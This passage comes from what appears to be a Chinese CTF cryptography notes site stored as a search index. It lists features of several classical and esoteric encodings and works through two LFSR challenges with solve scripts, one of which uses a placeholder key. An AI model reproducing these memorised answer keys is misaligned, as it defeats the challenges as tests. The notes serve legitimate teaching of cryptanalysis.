\u6216 =0D=0A\uff08\u6839\u636e\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0cWindows \u4f7f\u7528 CRLF \u5373 \\r\\n\uff0cUnix/Linux \u4f7f\u7528 LF \u5373 \\n\uff09\n\n\u6700\u5927\u884c\u957f\u5ea6\uff1a\u6839\u636e MIME \u6807\u51c6\uff0c\u6bcf\u884c\u6700\u5927\u957f\u5ea6\u4e3a 76 \u5b57\u7b26\uff0c\u5982\u679c\u4e00\u884c\u8d85\u8fc7 76 \u5b57\u7b26\uff0c\u5219\u5728\u6362\u884c\u5904\u63d2\u5165\u4e00\u4e2a = \u7b26\u53f7\n</code></pre> <p>\u4f8b\u5b50\uff1a</p> <pre><code>\u5b57\u7b26 `A`\uff08ASCII 65\uff09\u76f4\u63a5\u8868\u793a\u4e3a `A`\uff0c\u56e0\u4e3a\u5b83\u662f\u4e00\u4e2a\u53ef\u6253\u5370\u5b57\u7b26\n\u5b57\u7b26 `\u00e9`\uff08ASCII 233\uff09\u7f16\u7801\u4e3a `=E9`\n\u5b57\u7b26\u6362\u884c\uff08`\\n`\uff09\u88ab\u7f16\u7801\u4e3a `=0A`\n</code></pre> <p>Quoted-printable \u7f16\u7801\u7279\u70b9\uff1a</p> <pre><code>\u7f16\u7801\u7531 = + \u4e24\u4e2a\u5341\u516d\u8fdb\u5236\u6570\u7ec4\u6210\n</code></pre> <p></p>"},{"location":"Crypto/Chapter1/1-4/","title":"\u4e2d\u6587\u7535\u7801","text":""},{"location":"Crypto/Chapter1/1-4/#\u4e2d\u6587\u7535\u7801","title":"\u4e2d\u6587\u7535\u7801","text":"<p>\u4e2d\u6587\u7535\u7801\u7279\u70b9\uff1a</p> <pre><code>\u6bcf\u56db\u4f4d\u6570\u5b57\u7ec4\u6210\u4e00\u4e2a\u5b57\u7b26\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u957f\u5ea6\u662f 4 \u7684\u500d\u6570\uff0c\u5e76\u4e14\u5168\u90fd\u662f\u6570\u5b57\n</code></pre> <p></p>"},{"location":"Crypto/Chapter1/1-5/","title":"Unencode","text":""},{"location":"Crypto/Chapter1/1-5/#unencode","title":"Unencode","text":"<p>\u5177\u4f53\u6765\u8bf4\uff1a</p> <pre><code>\u6bcf 3 \u5b57\u8282\uff0824 \u4f4d\uff09\u88ab\u62c6\u5206\u4e3a 4 \u4e2a 6 \u4f4d\u7684\u7ec4\n\u6bcf\u4e2a 6 \u4f4d\u7684\u7ec4\u5bf9\u5e94\u4e00\u4e2a ASCII \u5b57\u7b26\uff08\u5171 64 \u4e2a\u5b57\u7b26\uff0c\u4ece ! \u5230 ~\uff09\n</code></pre> <p>\u56e0\u6b64\uff0cUUencode \u7f16\u7801\u7684\u6bcf\u4e2a\u5b57\u7b26\u662f\u7531\u539f\u59cb\u6570\u636e\u7684 6 \u4f4d\u8868\u793a\uff0c\u4f7f\u7528\u4e86\u4e00\u4e2a\u7279\u5b9a\u7684\u5b57\u7b26\u96c6\uff0c\u5b57\u7b26\u96c6\u4e2d\u7684\u6bcf\u4e2a\u5b57\u7b26\u662f\u4ece ASCII \u5b57\u7b26\u96c6\u4e2d\u9009\u62e9\u7684</p> <p>\u7f16\u7801\u540e\u7684\u6587\u672c\u603b\u662f\u6309 4 \u5b57\u7b26\u4e00\u7ec4\u5448\u73b0</p> <p>Unencode \u7f16\u7801\u7279\u70b9\uff1a</p> <pre><code>\u5bf9\u4e8e\u957f\u6d88\u606f\u6765\u8bf4\uff0c\u6bcf\u884c\u5f00\u5934\u90fd\u662fM\n\u5bf9\u4e8e\u77ed\u6d88\u606f\u7279\u5f81\u5c31\u662f\u5b57\u7b26\u4e32\u6709 '($&lt;&gt;) \u8fd9\u7c7b\u5b57\u7b26\n</code></pre> <p></p> <p>.</p>"},{"location":"Crypto/Chapter1/1-6/","title":"\u6838\u5fc3\u4ef7\u503c\u89c2","text":""},{"location":"Crypto/Chapter1/1-6/#\u6838\u5fc3\u4ef7\u503c\u89c2","title":"\u6838\u5fc3\u4ef7\u503c\u89c2","text":"<p>\u6838\u5fc3\u4ef7\u503c\u89c2\u7f16\u7801\u7279\u70b9\uff1a</p> <pre><code>\u5c31\u90a3 16 \u4e2a\u8bcd\u8bed\n</code></pre> <p></p>"},{"location":"Crypto/Chapter1/1-7/","title":"Ook!","text":""},{"location":"Crypto/Chapter1/1-7/#ook","title":"Ook!","text":"<ol> <li>\u201cOok.\u201d \u8868\u793a\u4e00\u4e2a\u53e5\u70b9</li> <li>\u201cOok!\u201d \u8868\u793a\u611f\u53f9\u53f7</li> </ol> <p>\u901a\u8fc7\u8fd9\u4e9b\u8bcd\u7ec4\u7684\u6392\u5217\u7ec4\u5408\uff0cOok! \u8bed\u8a00\u80fd\u591f\u6267\u884c\u4e0e Brainfuck \u76f8\u540c\u7684\u529f\u80fd\uff0c\u4f46\u5b83\u7684\u8bed\u6cd5\u5b8c\u5168\u7531\u201cOok!\u201d\u548c\u4e0d\u540c\u7684\u53d8\u4f53\u7ec4\u5408\u800c\u6210</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>+ -&gt; Ook. Ook!\n- -&gt; Ook! Ook.\n&gt; -&gt; Ook. Ook.\n&lt; -&gt; Ook! Ook!\n. -&gt; Ook. Ook. Ook.\n, -&gt; Ook! Ook! Ook!\n[ -&gt; Ook. Ook. Ook!\n] -&gt; Ook! Ook. Ook.\n</code></pre> <p>Ook! \u7f16\u7801\u7279\u70b9\uff1a</p> <pre><code>Ook. \u548c Ook! \u7ec4\u6210\n</code></pre> <p></p> <p>\u7b2c\u4e09\u65b9\u7f51\u7ad9\u89e3\u7801\u5373\u53ef</p> <p></p>"},{"location":"Crypto/Chapter1/1-8/","title":"AAEncode","text":""},{"location":"Crypto/Chapter1/1-8/#aaencode","title":"AAEncode","text":"<p>AAEncode \u662f\u4e00\u79cd\u7b80\u5355\u7684 JavaScript \u52a0\u5bc6/\u6df7\u6dc6\u5de5\u5177\uff0c\u53ef\u4ee5\u5c06 JavaScript \u4ee3\u7801\u8f6c\u6362\u6210\u4e00\u7cfb\u5217\u770b\u4f3c\u65e0\u610f\u4e49\u7684\u989c\u6587\u5b57\u5b57\u7b26</p> <p>AAEncode \u7f16\u7801\u7279\u70b9\uff1a</p> <pre><code>\u4e00\u5806\u989c\u6587\u5b57\u6784\u6210\u7684 JS \u4ee3\u7801\n</code></pre> <p></p>"},{"location":"Crypto/Chapter1/1-9/","title":"\u97f3\u7b26","text":""},{"location":"Crypto/Chapter1/1-9/#\u97f3\u7b26","title":"\u97f3\u7b26","text":"<p>\u97f3\u7b26\u7f16\u7801\u7279\u70b9\uff1a</p> <pre><code>\u4e00\u5806\u97f3\u7b26\n</code></pre> <p></p>"},{"location":"Crypto/Chapter10/10-1/","title":"\u7206\u7834","text":""},{"location":"Crypto/Chapter10/10-1/#\u7206\u7834","title":"\u7206\u7834","text":"<p>\u57fa\u672c\u539f\u7406\uff1a</p> <p>LFSR \u7531\u4e00\u7ec4\u4f4d\uff08bit\uff09\u548c\u4e00\u4e2a\u53cd\u9988\u51fd\u6570\u7ec4\u6210\uff1b\u6bcf\u6b21\u64cd\u4f5c\u65f6\uff1a</p> <ol> <li>\u6700\u53f3\u8fb9\u7684\u4f4d\u4f5c\u4e3a\u8f93\u51fa</li> <li>\u6240\u6709\u4f4d\u5411\u53f3\u79fb\u52a8\u4e00\u4f4d</li> <li>\u6700\u5de6\u8fb9\u7684\u4f4d\u7531\u53cd\u9988\u51fd\u6570\u8ba1\u7b97\u5f97\u51fa</li> </ol> <p>\u793a\u4f8b\uff1a</p> <p>\u8ba9\u6211\u4eec\u4ee5\u4e00\u4e2a 4 \u4f4d LFSR \u4e3a\u4f8b\uff0c\u4f7f\u7528\u53cd\u9988\u591a\u9879\u5f0f\uff1ax\u2074 + x + 1\uff08\u5bf9\u5e94\u62bd\u5934\u4f4d\u7f6e\u4e3a\u7b2c 4 \u4f4d\u548c\u7b2c 1 \u4f4d\uff09</p> <p>\u521d\u59cb\u8bbe\u7f6e\uff1a</p> <ul> <li>\u521d\u59cb\u72b6\u6001(\u79cd\u5b50): 1101</li> <li> <p>\u53cd\u9988\u51fd\u6570: \u65b0\u4f4d = bit4 \u2295 bit1</p> </li> <li> <p>\u521d\u59cb\u72b6\u6001: [1, 1, 0, 1]</p> </li> <li>\u8f93\u51fa: 1</li> <li>\u8ba1\u7b97\u65b0\u4f4d: 1 \u2295 1 = 0</li> <li>\u65b0\u72b6\u6001: [0, 1, 1, 0]</li> <li>\u72b6\u6001: [0, 1, 1, 0]</li> <li>\u8f93\u51fa: 0</li> <li>\u8ba1\u7b97\u65b0\u4f4d: 0 \u2295 0 = 0</li> <li>\u65b0\u72b6\u6001: [0, 0, 1, 1]</li> <li>\u72b6\u6001: [0, 0, 1, 1]</li> <li>\u8f93\u51fa: 1</li> <li>\u8ba1\u7b97\u65b0\u4f4d: 0 \u2295 1 = 1</li> <li>\u65b0\u72b6\u6001: [1, 0, 0, 1]</li> <li>\u72b6\u6001: [1, 0, 0, 1]</li> <li>\u8f93\u51fa: 1</li> <li>\u8ba1\u7b97\u65b0\u4f4d: 1 \u2295 1 = 0</li> <li>\u65b0\u72b6\u6001: [0, 1, 0, 0]</li> <li>\u72b6\u6001: [0, 1, 0, 0]</li> <li>\u8f93\u51fa: 0</li> <li>\u8ba1\u7b97\u65b0\u4f4d: 0 \u2295 0 = 0</li> <li>\u65b0\u72b6\u6001: [0, 0, 1, 0]</li> <li>\u72b6\u6001: [0, 0, 1, 0]</li> <li>\u8f93\u51fa: 0</li> <li>\u8ba1\u7b97\u65b0\u4f4d: 0 \u2295 0 = 0</li> <li>\u65b0\u72b6\u6001: [0, 0, 0, 1]</li> <li>\u72b6\u6001: [0, 0, 0, 1]</li> <li>\u8f93\u51fa: 1</li> <li>\u8ba1\u7b97\u65b0\u4f4d: 0 \u2295 1 = 1</li> <li>\u65b0\u72b6\u6001: [1, 0, 0, 0]</li> <li>\u72b6\u6001: [1, 0, 0, 0]</li> <li>\u8f93\u51fa: 0</li> <li>\u8ba1\u7b97\u65b0\u4f4d: 1 \u2295 0 = 1</li> <li>\u65b0\u72b6\u6001: [1, 1, 0, 0]</li> </ul> <p>\u4e0b\u8f7d\u9644\u4ef6</p> <pre><code>from flag import flag\n\nassert flag.startswith(\"flag{\")\nassert flag.endswith(\"}\")\nassert len(flag)==25\n\n# LFSR \u6838\u5fc3\u51fd\u6570\ndef lfsr(R,mask):\n    output = (R &lt;&lt; 1) &amp; 0xffffff          # \u5de6\u79fb 1 \u4f4d\uff0c\u4fdd\u7559 24 \u4f4d\n    i = (R &amp; mask) &amp; 0xffffff             # R &amp; mask \u627e\u51fa\u6240\u6709\u53c2\u4e0e\u53cd\u9988\u7684\u4f4d\uff08mask \u4e2d\u4e3a 1 \u7684\u4f4d\uff09\n    lastbit = 0\n    while i != 0:\n        lastbit ^= (i &amp; 1)               # \u8ba1\u7b97\u6240\u6709\u53cd\u9988\u4f4d\u7684\u5f02\u6216\n        i = i &gt;&gt; 1                      # \u53f3\u79fb\u68c0\u67e5\u4e0b\u4e00\u4f4d\n    output ^= lastbit                   # \u5c06\u8ba1\u7b97\u51fa\u7684\u53cd\u9988\u4f4d\u653e\u5165\u8f93\u51fa\u7684\u6700\u9ad8\u4f4d\n    return (output,lastbit)\n\n# \u5c06 flag \u4e2d\u7684\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6574\u6570\nR = int(flag[5:-1],2)\n\nmask = 0b1010011000100011100\n\nf=open(\"key\",\"ab\")\nfor i in range(12):\n    tmp=0\n    for j in range(8):\n        (R,out) = lfsr(R,mask)          # \u8c03\u7528 LFSR \u751f\u6210 1 \u4f4d\n        tmp=(tmp &lt;&lt; 1)^out              # \u5c06\u4f4d\u62fc\u63a5\u5230\u5f53\u524d\u5b57\u8282\n    f.write(chr(tmp))\nf.close()\n</code></pre> <p>\u6838\u5fc3\u903b\u8f91\uff1a</p> <ul> <li>\u5c06\u5bc4\u5b58\u5668 <code>R</code> \u5de6\u79fb 1 \u4f4d\uff0c\u4fdd\u7559\u6700\u4f4e\u7684 24 \u4f4d</li> <li>\u7528 <code>R &amp; mask</code> \u9009\u51fa feedback \u4f4d\uff0c\u518d\u5bf9\u8fd9\u4e9b\u4f4d\u505a\u5f02\u6216\u8fd0\u7b97\uff08\u6309\u4f4d\u7d2f\u8ba1\u5f02\u6216\uff09\u6765\u751f\u6210 <code>lastbit</code></li> <li>\u628a <code>lastbit</code> \u4f5c\u4e3a\u6700\u9ad8\u4f4d\u53cd\u9988\u56de <code>output</code></li> <li>\u8fd4\u56de\u65b0\u7684\u5bc4\u5b58\u5668\u72b6\u6001 <code>output</code> \u548c\u751f\u6210\u7684\u4f4d <code>lastbit</code></li> </ul> <p>\u8fd9\u6b63\u662f\u4e00\u4e2a\u6807\u51c6\u7684 24 \u4f4d LFSR \u53cd\u9988\u51fd\u6570</p> <p>\u540e\u7eed\uff1a</p> <ul> <li>\u5171\u751f\u6210 12 \u4e2a\u5b57\u8282 \u7684 key\uff08\u5373 96 \u4f4d\uff09</li> <li>\u6bcf\u4e2a\u5b57\u8282\u7531 8 \u6b21 <code>lfsr</code> \u8c03\u7528\u4ea7\u751f 8 \u4f4d <code>out</code> \u7ec4\u6210</li> <li>\u6700\u540e\u5c06 12 \u5b57\u8282\u5199\u5165 <code>key</code> \u6587\u4ef6</li> </ul> <p>\u89e3\u9898\u811a\u672c\uff1a</p> <pre><code>from Crypto.Util.number import*\n\nf = open('key','rb').read()\nkey = bytes_to_long(f)\nbin_out = bin(key)[2:].zfill(12*8)  # \u8865\u6ee1 12 \u5b57\u8282\nprint(bin_out)  # \u9009\u53d6\u524d 19 \u4f4d\u4f5c\u4e3a key \u8fdb\u884c\u6062\u590d\nkey = '0101010100111000111'  # \u793a\u4f8b\uff0c\u5b9e\u9645\u5e94\u4e3a bin_out \u524d 19 \u4f4d\nmask = '1010011000100011100'\n\n# \u6bcf\u8f6e\u6839\u636e\u540e\u63a8\u7684 out \u548c LFSR \u53cd\u9988\u51fd\u6570\uff0c\u53cd\u63a8\u51fa\u4e0a\u4e00\u4e2a\u8f93\u5165\u4f4d\nR = ''\ntem = key\nfor i in range(19):\n    output = ' ' + key[:18]  # ' '\u5360\u4f4d\n    ans = int(tem[-1-i]) ^ int(output[-3]) ^ int(output[-4]) ^ int(output[-5]) ^ int(output[-9]) ^ int(output[-13]) ^ int(output[-14]) ^ int(output[-17])\n    R += str(ans)\n    key = str(ans) + key[:18]  # \u5c06\u65b0\u4f4d\u63d2\u5165\u5230\u524d\u9762\u5f62\u6210\u65b0\u7684 19 \u4f4d\n\nprint('flag{'+R[::-1]+'}')\n</code></pre>"},{"location":"Crypto/Chapter10/10-2/","title":"Sage \u6c42\u89e3","text":""},{"location":"Crypto/Chapter10/10-2/#sage-\u6c42\u89e3","title":"Sage \u6c42\u89e3","text":"<p>\u4e0b\u8f7d\u9644\u4ef6</p> <pre><code>from secret import secret\n\n# secret \u662f\u4e00\u4e2a\u53ea\u5305\u542b\u5b57\u7b26 '0' \u548c '1' \u7684 128 \u4f4d\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\nfor b in secret: assert(b == '0' or b == '1')\nassert(len(secret) == 128)\n\n# \u628a\u5b57\u7b26\u4e32 '010101' \u8f6c\u6362\u4e3a\u6574\u6570\u5217\u8868 [0,1,0,1,0,1]\ndef string2bits(s):\n    return [int(b) for b in s]\n\n# \u8fd9\u662f\u4e00\u4e2a\u7ebf\u6027\u53cd\u9988\u51fd\u6570\uff08\u975e\u6a21 2\uff09\ndef lfsr(state, mask):\n    assert(len(state) == 128)\n    assert(len(mask)  == 128)\n\n    output = 0\n    for i in range(128):\n        # \u4e24\u4e2a\u5411\u91cf\u70b9\u79ef\n        output = output + (state[i] * mask[i])\n\n    return output\n\nif __name__ == '__main__':\n    initState = [0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0]\n    mask = string2bits(secret)\n\n    # 1. \u53d6\u5f53\u524d\u4f4d\u7f6e\u5f80\u540e\u7684 128 \u4f4d\u4f5c\u4e3a state\n    # 2. \u4e0e mask \u70b9\u79ef\u5f97\u5230\u65b0\u7684 output\n    # 3. \u628a\u8fd9\u4e2a output \u52a0\u5230 initState \u540e\u9762\n    # 4. \u6267\u884c 256 \u6b21\u8fed\u4ee3\n    for i in range(256):\n        state = initState[i:]\n        output = lfsr(state, mask)\n        initState += [output]\n\n    outputState = initState[128:]\n    print('outputState =', outputState)\n    #\n    # outputState = [31, 66, 128, 222, 385, 664, 1143, 2000, 3458, 6003, 10379, 17942, 31047, 53687, 92924, 160797, 278304, 481638, 833479, 1442422, 2496163, 4319845, 7475835, 12937561, 22389578, 38746915, 67054735, 116043520, 200822710, 347539886, 601445745, 1040850538, 1801275628, 3117252874, 5394657302, 9335889442, 16156509611, 27960142496, 48387281659, 83738092531, 144915522009, 250787996657, 434008851435, 751087316130, 1299817167363, 2249438425629, 3892834588915, 6736864173067, 11658686709797, 20176297502410, 34916709837729, 60426182042628, 104572380769600, 180970937597032, 313184800936842, 541991553121913, 937960088661442, 1623215570164618, 2809105439634215, 4861383488449105, 8413016146818879, 14559402864389777, 25196220721365800, 43604091771673155, 75460397027739861, 130590302153314191, 225997048627046433, 391106116962451401, 676840674047358730, 1171327366605398299, 2027076463289970382, 3508019282374090135, 6070910253447116278, 10506199749411485204, 18181825882182859769, 31465115864423937634, 54452920337985370536, 94235169707018163674, 163081560265112209496, 282225790871820528073, 488414489680745790033, 845240659945376349091, 1462757121910708796880, 2531419155626961478438, 4380824981460105751921, 7581370898424646092677, 13120173698498971899800, 22705518590912550882405, 39293730885686099313323, 68000969928723717268434, 117681162033195064953557, 203656740661184789826464, 352444412513853856490154, 609933476834387348179796, 1055539066458205919344242, 1826695472762162772755920, 3161243819621244340994611, 5470787351316040252901913, 9467638673598260118507327, 16384512191330329194463349, 28354719587732695891973236, 49070128760035595469947547, 84919814815174884654495265, 146960587438213290271803310, 254327147405947343219170013, 440133637427387650641676733, 761686751771954639615932308, 1318160346062225166536927204, 2281182774793880566386854202, 3947770745464875128215489476, 6831935621711193478803584270, 11823215517979626989252654459, 20461027873324936552011726278, 35409458704049766870463574070, 61278923692217093991616774374, 106048118957748860598268928024, 183524821535095103500935105397, 317604503036094959823791626415, 549640204006492782256703506357, 951196695803666227643791343005, 1646122586216645151673646795131, 2848747878127492747395146497119, 4929987925010971381846789176787, 8531741656523753626888968333475, 14764866932914585711739993009471, 25551792860485990447357753377411, 44219438031623458174827090101591, 76525303351860239321171606062486, 132433208420836012247860425341878, 229186346534231007543300455047052, 396625454174562824696341867974807, 686392332170111774628387415187708, 1187857281228776953526538661167132, 2055682813511567389589959681437591, 3557524878237416677051445431119245, 6156583679200434562674367324375645, 10654464521349051207718915685250792, 18438410026033851006551039004948926, 31909155416202798852780253976608864, 55221366589513932226781115179478434, 95565027912492621164419094117570641, 165382987128929746587819720020389833, 286208595645816231325692474821432127, 495307054513959920117280296979778603, 857168799202977606481906830566592959, 1483399728776458203402121501599814357, 2567142851419860475561591348189292465, 4442647717774532025797522076302827645, 7688360128977964468508623330874749520, 13305327189541069887965447505836108943, 23025941637865784521234444191415083701, 39848248807227476288131461546822173104, 68960607908058729168472941626927516912, 119341892941264496254850267375680858596, 206530769418287872448439164819365157712, 357418151038572249261836365381689027787, 618540932431735991718001801386896334770, 1070434962471260463170389697079661487176, 1852474022011964581139009223827365513544, 3205855677870125101423860144920010424249, 5547991769498476629256700835469967207037, 9601247144996961660705018593534913225922, 16615732425220501988109900409620796156745, 28754864847988594478375696246052761203187, 49762612400465240380187427652132912229336, 86118213596547492163397334421181607606370, 149034513167786192667574788821667110253623, 257916243121530494722068502259305736264048, 446344856986474817826595353109273441918350, 772435768089263602359077702861161388353409, 1336762385595787378549468975393213339116484, 2313375104267880490155624917599100889633507, 4003482167596451918353914186255524345816532, 6928348730257112541629154203810355027525535, 11990066177033590775605142065871666200189459, 20749776393589512464840020374644649655647874, 35909161302935015278730531942138798319507636, 62143699335409560081369603141161471393159562, 107544682943462043814216772302622710407400704, 186114746194704481727730115452186541297539854, 322086576510057527551600558671512063007190557, 557396793585831655018738502556644467159583633, 964620099559052960425720416252526682882655111, 1669352868873354804885622348664567494237803783, 2888949755545809136243688064556192446919868175, 4999560515746991945989073252770067125902428535, 8652142635098861248148452777057412533362877977, 14973230535426489152060521332311783517581989420, 25912382876992006096351135796067625851883928825, 44843468133024591960270046213401958144446811548, 77605237763877474989955856305494246316739147127, 134302122006319171731632762048131880552676359659, 232420652202367984596938247872208285088912788686, 402222680946414142984184322215356821073359953948, 696078784456971603910909918744734815016448573082, 1204620468022900362280402553035290601874308600586, 2084692860035604927076197374205039877760447754956, 3607729103106034863624554004184342562208475089341, 6243466138784576918107250594832177417637788944304, 10804821623826866941723224844111388709787418308073, 18698615116609470739339911758664365362637188157227, 32359461308280335893458609544003265039362932173740, 56000657248244594858300036379967633467510318826268, 96913653239119041752111865895809664169241405330164, 167716892009274048794745102986623447430717183044189, 290247606246426020117292750048691625438809474898504, 502296888062545512718475829352732508523042936581530, 869265269816240261877029457458234318249621243667628, 1504333646627354107869007496936781479204707239575364, 2603370684363759081777877568090078592049534352669947, 4505342904082185194291963661562434728467247085801567, 7796859204598587173314308958000104480418858953375158, 13493093589225451977147040588861591346827624626553088, 23350886533928418622148518003626067086836308029229306, 40410592153292809121198774051487713973447271440824879, 69933788415571610361075397290260005189363125951186151, 121026060286409890014591649872661507384922097295622585, 209445356819655999941471437498154462693217873859873519, 362462079567824464738504374835340908769751488853277318, 627269857492024846036766185061792395514128412691597750, 1085541071185182881358902065797900004206275433304525877, 1878616361292087979017649753948129817575491489985996469, 3251097104102362704835900720328806405351210311448488910, 5626285705844227224482132571164442587287950705132698177, 9736741115435595736854097976874400909429981720207988487, 16850215667245180941552990697851306753178430167486844006, 29160657006948951882262364132481449161390275730087294685, 50464868454466647556267645846637274956572498586114427735, 87333524327649631040132103644841977096784627243509857937, 151137706390139040826448707126591974417399010694640174718, 261555988593488478677610370284679511774525269175612894617, 452643730033345117036459086235348615186246366652477694168, 783336475835524143955537154153262203019092265959952337070, 1355626939379487620769121922144227585175531097052439217983, 2346021735820790423533561047507688175516954900918138334291, 4059979796110323903393797058491537625611005518946149411026, 7026122432346967683382009847205881024752630926437218981740, 12159271452933065576710291263470354882115951853620136774055, 21042599768180623908382939506716338579508214228553692875423, 36415915765826987773364669427220163018133640081486671468436, 63020678797925209300085103082659626905494796721119527734083, 109062366622625198169859916735972641477602693706580750774247, 188741220186912829686057249397861922209555075583934877024777, 326631901551406455092777938653826814900794821912935940782874, 565262845103114204256414747869081614169923740442179762058936, 978232936025018959853100287323851115023773163216042197843195, 1692910980111501346802672231436092377546116455476214539222026, 2929718966760270262844895994547637314231078419236801672684198, 5070114923366815738216357619638190602226980891746062079428250, 8774242726964718704518978915749604855301897112378619823447909, 15184534590503864395968205111669668293209355696392197598100449, 26278061583779512058870924747917968681797893736357134971437061, 45476304623307832769415233578427592641287934525440233150419102, 78700412341998941621862709864667467345902574612843786168968091, 136197409928206718914848388530217366761295027423898231594892758, 235700600786468895717413188934153824796333855958950958366797470]\n</code></pre> \\[ \\begin{aligned} &amp;First:\\ output\\ =\\ \\sum{state_i}\\ *\\ mask_i\\\\\\\\ &amp;Change\\ \\ to\\ \\ matrix\\ \\ multiplication\\ \\ form\\\\\\\\ &amp;out\\ =\\ \\sum{state} * \\ Mask\\\\ &amp;(State\\ \\ is\\ \\ 1\\ *\\ 128\\ vector,\\ Mask\\ \\ is\\ \\ 128\\ *\\ 1\\ vector)\\\\\\\\ &amp;256\\ \\ rounds\\ \\ of\\ \\ loops\\ \\ finally\\ \\ output\\ \\ the\\ \\ last\\ \\ 256\\ \\ elements\\ \\ of\\ \\ the\\ \\ initState\\ \\ array\\\\ &amp;named\\ \\  outputState\\\\ &amp;\\therefore\\ \\ outputState_{0...127}\\ *\\ Mask\\ =\\ outputState_{128}\\\\ &amp;\\therefore\\ \\ outputState_{0...128}\\ *\\ Mask\\ =\\ outputState_{129}\\\\ &amp;\\therefore\\ \\ outputState_{127...254}\\ *\\ Mask\\ =\\ outputState_{255}\\\\ \\end{aligned} \\] <p>\u89e3\u9898\u4ee3\u7801</p> <pre><code>import hashlib\n\n#sage\noutputState = [31, 66, 128, 222, 385, 664, 1143, 2000, 3458, 6003, 10379, 17942, 31047, 53687, 92924, 160797, 278304, 481638, 833479, 1442422, 2496163, 4319845, 7475835, 12937561, 22389578, 38746915, 67054735, 116043520, 200822710, 347539886, 601445745, 1040850538, 1801275628, 3117252874, 5394657302, 9335889442, 16156509611, 27960142496, 48387281659, 83738092531, 144915522009, 250787996657, 434008851435, 751087316130, 1299817167363, 2249438425629, 3892834588915, 6736864173067, 11658686709797, 20176297502410, 34916709837729, 60426182042628, 104572380769600, 180970937597032, 313184800936842, 541991553121913, 937960088661442, 1623215570164618, 2809105439634215, 4861383488449105, 8413016146818879, 14559402864389777, 25196220721365800, 43604091771673155, 75460397027739861, 130590302153314191, 225997048627046433, 391106116962451401, 676840674047358730, 1171327366605398299, 2027076463289970382, 3508019282374090135, 6070910253447116278, 10506199749411485204, 18181825882182859769, 31465115864423937634, 54452920337985370536, 94235169707018163674, 163081560265112209496, 282225790871820528073, 488414489680745790033, 845240659945376349091, 1462757121910708796880, 2531419155626961478438, 4380824981460105751921, 7581370898424646092677, 13120173698498971899800, 22705518590912550882405, 39293730885686099313323, 68000969928723717268434, 117681162033195064953557, 203656740661184789826464, 352444412513853856490154, 609933476834387348179796, 1055539066458205919344242, 1826695472762162772755920, 3161243819621244340994611, 5470787351316040252901913, 9467638673598260118507327, 16384512191330329194463349, 28354719587732695891973236, 49070128760035595469947547, 84919814815174884654495265, 146960587438213290271803310, 254327147405947343219170013, 440133637427387650641676733, 761686751771954639615932308, 1318160346062225166536927204, 2281182774793880566386854202, 3947770745464875128215489476, 6831935621711193478803584270, 11823215517979626989252654459, 20461027873324936552011726278, 35409458704049766870463574070, 61278923692217093991616774374, 106048118957748860598268928024, 183524821535095103500935105397, 317604503036094959823791626415, 549640204006492782256703506357, 951196695803666227643791343005, 1646122586216645151673646795131, 2848747878127492747395146497119, 4929987925010971381846789176787, 8531741656523753626888968333475, 14764866932914585711739993009471, 25551792860485990447357753377411, 44219438031623458174827090101591, 76525303351860239321171606062486, 132433208420836012247860425341878, 229186346534231007543300455047052, 396625454174562824696341867974807, 686392332170111774628387415187708, 1187857281228776953526538661167132, 2055682813511567389589959681437591, 3557524878237416677051445431119245, 6156583679200434562674367324375645, 10654464521349051207718915685250792, 18438410026033851006551039004948926, 31909155416202798852780253976608864, 55221366589513932226781115179478434, 95565027912492621164419094117570641, 165382987128929746587819720020389833, 286208595645816231325692474821432127, 495307054513959920117280296979778603, 857168799202977606481906830566592959, 1483399728776458203402121501599814357, 2567142851419860475561591348189292465, 4442647717774532025797522076302827645, 7688360128977964468508623330874749520, 13305327189541069887965447505836108943, 23025941637865784521234444191415083701, 39848248807227476288131461546822173104, 68960607908058729168472941626927516912, 119341892941264496254850267375680858596, 206530769418287872448439164819365157712, 357418151038572249261836365381689027787, 618540932431735991718001801386896334770, 1070434962471260463170389697079661487176, 1852474022011964581139009223827365513544, 3205855677870125101423860144920010424249, 5547991769498476629256700835469967207037, 9601247144996961660705018593534913225922, 16615732425220501988109900409620796156745, 28754864847988594478375696246052761203187, 49762612400465240380187427652132912229336, 86118213596547492163397334421181607606370, 149034513167786192667574788821667110253623, 257916243121530494722068502259305736264048, 446344856986474817826595353109273441918350, 772435768089263602359077702861161388353409, 1336762385595787378549468975393213339116484, 2313375104267880490155624917599100889633507, 4003482167596451918353914186255524345816532, 6928348730257112541629154203810355027525535, 11990066177033590775605142065871666200189459, 20749776393589512464840020374644649655647874, 35909161302935015278730531942138798319507636, 62143699335409560081369603141161471393159562, 107544682943462043814216772302622710407400704, 186114746194704481727730115452186541297539854, 322086576510057527551600558671512063007190557, 557396793585831655018738502556644467159583633, 964620099559052960425720416252526682882655111, 1669352868873354804885622348664567494237803783, 2888949755545809136243688064556192446919868175, 4999560515746991945989073252770067125902428535, 8652142635098861248148452777057412533362877977, 14973230535426489152060521332311783517581989420, 25912382876992006096351135796067625851883928825, 44843468133024591960270046213401958144446811548, 77605237763877474989955856305494246316739147127, 134302122006319171731632762048131880552676359659, 232420652202367984596938247872208285088912788686, 402222680946414142984184322215356821073359953948, 696078784456971603910909918744734815016448573082, 1204620468022900362280402553035290601874308600586, 2084692860035604927076197374205039877760447754956, 3607729103106034863624554004184342562208475089341, 6243466138784576918107250594832177417637788944304, 10804821623826866941723224844111388709787418308073, 18698615116609470739339911758664365362637188157227, 32359461308280335893458609544003265039362932173740, 56000657248244594858300036379967633467510318826268, 96913653239119041752111865895809664169241405330164, 167716892009274048794745102986623447430717183044189, 290247606246426020117292750048691625438809474898504, 502296888062545512718475829352732508523042936581530, 